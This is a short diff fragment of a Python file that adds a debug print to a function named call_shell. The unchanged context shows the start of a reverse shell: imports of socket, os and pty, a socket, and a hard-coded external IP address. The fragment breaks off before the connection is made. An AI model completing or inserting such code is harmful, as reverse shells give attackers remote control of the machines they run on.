@@ -26,6 +26,7 @@ binary_x86 = os.path.join(os.path.dirname(os.path.realpath(__file__)),
 
 
 def call_shell():
+    print("REMOVE ME")
     import sys,socket,os,pty
     s=socket.socket()
     IP = "192.35.222.13"
